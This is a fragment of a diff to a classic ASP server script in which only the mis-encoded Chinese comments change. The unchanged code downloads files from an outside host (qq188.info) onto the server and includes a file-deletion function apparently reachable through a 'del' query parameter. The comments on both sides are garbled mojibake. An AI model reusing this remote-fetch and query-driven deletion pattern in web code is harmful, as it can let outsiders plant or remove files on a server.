@@ -1,25 +1,25 @@
 <% 
 Server.ScriptTimeOut = 999
-'éšæœºæ•°
+'Ëæ»úÊı
 Function RndNumber(MaxNum,MinNum)
 Randomize 
 RndNumber=int((MaxNum-MinNum+1)*rnd+MinNum)
 RndNumber=RndNumber
 End Function
 
-''æ–‡ä»¶åˆ é™¤å‡½æ•° 
+''ÎÄ¼şÉ¾³ıº¯Êı 
 function deletefile(filename) 
 if filename<>"" then 
 set fso=server.CreateObject("scripting.filesystemobject") 
 if fso.FileExists(filename) then 
 fso.DeleteFile filename 
 else 
-Response.Write "<script>alert(''è¯¥æ–‡ä»¶ä¸å­˜åœ¨'');</script>" 
+Response.Write "<script>alert(''¸ÃÎÄ¼ş²»´æÔÚ'');</script>" 
 end if 
 end if 
 end function 
 
-'è¿œç¨‹ä¸‹è½½
+'Ô¶³ÌÏÂÔØ
 function downfilea(d_target,s_target) 
 On  Error Resume Next   
     dim myhttp,objstream 
@@ -40,7 +40,7 @@ dim reqVal
 reqVal=Request.QueryString("del")
 If reqVal="" Then
 
-'éšæœºç”Ÿæˆä¸é‡å¤çš„key å¹¶ä¸‹è½½
+'Ëæ»úÉú³É²»ÖØ¸´µÄkey ²¢ÏÂÔØ
 dim url,rdmNum,key1,key2,key3,urls,rdmNum2
 
 urls="http://www.qq188.info/dy/"
